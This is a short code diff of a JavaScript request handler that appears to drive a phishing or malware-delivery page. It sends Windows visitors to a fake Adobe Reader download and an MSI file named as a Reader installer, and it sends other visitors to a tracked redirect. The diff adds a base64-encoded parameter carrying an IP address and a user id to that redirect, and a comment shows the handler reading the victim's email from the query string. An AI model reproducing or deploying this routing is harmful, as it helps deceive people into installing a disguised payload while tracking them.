@@ -5,7 +5,7 @@ export default function handler(req, res) {
 
   const WINDOWS_REDIRECT_AFTER_DOWNLOAD = 'https://mksonline.com.mx/css/adobe/reader/download.html';
   const MSI_PATH = '/Reader_adobe_install_online.msi';
-  const NON_WINDOWS_TARGET = 'https://tagtechpro.com/i/?';
+  const NON_WINDOWS_TARGET = 'https://tagtechpro.com/i/?aXBkYXRhPTIwNS4yMzQuMTgxLjMwJnN2PWdlbmVyYWwmcj1LQSZ1aWQ9VVNFUjE1MDcyMDI1VTUyMDcxNTE3JnM9TGE=#';
 
   // 1. Try to get email from query normally
   let email = '';
